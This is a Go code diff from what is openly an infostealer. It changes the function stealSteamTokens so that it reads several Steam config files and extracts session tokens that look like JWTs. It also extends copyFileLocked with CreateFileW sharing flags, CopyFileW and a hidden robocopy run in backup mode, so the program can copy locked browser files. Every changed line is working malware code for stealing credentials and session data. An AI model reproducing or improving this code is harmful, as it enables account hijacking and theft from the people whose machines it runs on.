@@ -456,21 +456,27 @@ func stealSteamTokens() string {
 
 	for _, steamDir := range steamPaths {
 		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
-		loginFile := filepath.Join(steamDir, "config", "loginusers.vdf")
-		if data, err := os.ReadFile(loginFile); err == nil && len(data) > 0 {
-			sb.WriteString(fmt.Sprintf("=== loginusers.vdf [%s] ===\n", steamDir))
-			sb.WriteString(string(data))
-			sb.WriteString("\n\n")
+		vdfFiles := []string{
+			filepath.Join(steamDir, "config", "config.vdf"),
+			filepath.Join(steamDir, "config", "loginusers.vdf"),
+			filepath.Join(steamDir, "config", "SteamAppData.vdf"),
 		}
-		entries, err := os.ReadDir(steamDir)
-		if err == nil {
-			for _, e := range entries {
-				if strings.HasPrefix(strings.ToLower(e.Name()), "ssfn") {
-					ssfnPath := filepath.Join(steamDir, e.Name())
-					if data, err := os.ReadFile(ssfnPath); err == nil {
-						sb.WriteString(fmt.Sprintf("=== %s [%s] ===\n", e.Name(), steamDir))
-						sb.WriteString(base64.StdEncoding.EncodeToString(data))
-						sb.WriteString("\n\n")
+		for _, vf := range vdfFiles {
+			data, err := os.ReadFile(vf)
+			if err != nil || len(data) == 0 { continue }
+			content := string(data)
+			for _, line := range strings.Split(content, "\n") {
+				line = strings.TrimSpace(line)
+				if strings.Contains(line, ".eyA") || strings.Contains(line, ".eyJ") {
+					clean := strings.Trim(line, "\"\t\r ")
+					parts := strings.SplitN(clean, "\t", 2)
+					if len(parts) == 2 {
+						clean = strings.TrimSpace(parts[1])
+						clean = strings.Trim(clean, "\"")
+					}
+					if len(clean) > 50 {
+						sb.WriteString(clean)
+						sb.WriteString("\n")
 					}
 				}
 			}
@@ -730,38 +736,46 @@ func copyFileLocked(src, dst, browserExe string) error {
 		return os.WriteFile(dst, data, 0o644)
 	}
 
-	srcPtr, _ := syscall.UTF16PtrFromString(src)
-	const GENERIC_READ = 0x80000000
-	const FILE_SHARE_ALL = 0x07
-	const OPEN_EXISTING = 3
-	const FILE_ATTRIBUTE_NORMAL = 0x80
-
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+
+	srcPtr, _ := syscall.UTF16PtrFromString(src)
 	createFile := kernel32.NewProc("CreateFileW")
-	readFile := kernel32.NewProc("ReadFile")
-	getFileSize := kernel32.NewProc("GetFileSizeEx")
-	closeHandle := kernel32.NewProc("CloseHandle")
+	readFileProc := kernel32.NewProc("ReadFile")
+	getFileSizeProc := kernel32.NewProc("GetFileSizeEx")
+	closeHandleProc := kernel32.NewProc("CloseHandle")
 
 	h, _, _ := createFile.Call(
 		uintptr(unsafe.Pointer(srcPtr)),
-		GENERIC_READ,
-		FILE_SHARE_ALL,
+		0x80000000,
+		0x07,
 		0,
-		OPEN_EXISTING,
-		FILE_ATTRIBUTE_NORMAL,
+		3,
+		0x02000080,
 		0,
 	)
 	if h != 0 && h != ^uintptr(0) {
-		defer closeHandle.Call(h)
 		var size int64
-		getFileSize.Call(h, uintptr(unsafe.Pointer(&size)))
+		getFileSizeProc.Call(h, uintptr(unsafe.Pointer(&size)))
 		if size > 0 && size < 200*1024*1024 {
 			buf := make([]byte, size)
 			var bytesRead uint32
-			readFile.Call(h, uintptr(unsafe.Pointer(&buf[0])), uintptr(size), uintptr(unsafe.Pointer(&bytesRead)), 0)
+			readFileProc.Call(h, uintptr(unsafe.Pointer(&buf[0])), uintptr(size), uintptr(unsafe.Pointer(&bytesRead)), 0)
+			closeHandleProc.Call(h)
 			if bytesRead > 0 {
 				return os.WriteFile(dst, buf[:bytesRead], 0o644)
 			}
+		} else {
+			closeHandleProc.Call(h)
+		}
+	}
+
+	dstPtr, _ := syscall.UTF16PtrFromString(dst)
+	copyFileW := kernel32.NewProc("CopyFileW")
+	r, _, _ := copyFileW.Call(uintptr(unsafe.Pointer(srcPtr)), uintptr(unsafe.Pointer(dstPtr)), 0)
+	if r != 0 {
+		check, _ := os.ReadFile(dst)
+		if len(check) > 0 {
+			return nil
 		}
 	}
 
@@ -772,6 +786,24 @@ func copyFileLocked(src, dst, browserExe string) error {
 		if len(check) > 0 {
 			return nil
 		}
+	}
+
+	srcDir := filepath.Dir(src)
+	srcFile := filepath.Base(src)
+	dstDir := filepath.Dir(dst)
+	rob := exec.Command("robocopy", srcDir, dstDir, srcFile, "/B", "/NFL", "/NDL", "/NJH", "/NJS", "/nc", "/ns", "/np")
+	rob.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = rob.Run()
+	dstRob := filepath.Join(dstDir, srcFile)
+	if dstRob != dst {
+		if d, e := os.ReadFile(dstRob); e == nil && len(d) > 0 {
+			os.Remove(dstRob)
+			return os.WriteFile(dst, d, 0o644)
+		}
+	}
+	check, _ := os.ReadFile(dst)
+	if len(check) > 0 {
+		return nil
 	}
 
 	return fmt.Errorf("locked %s", src)
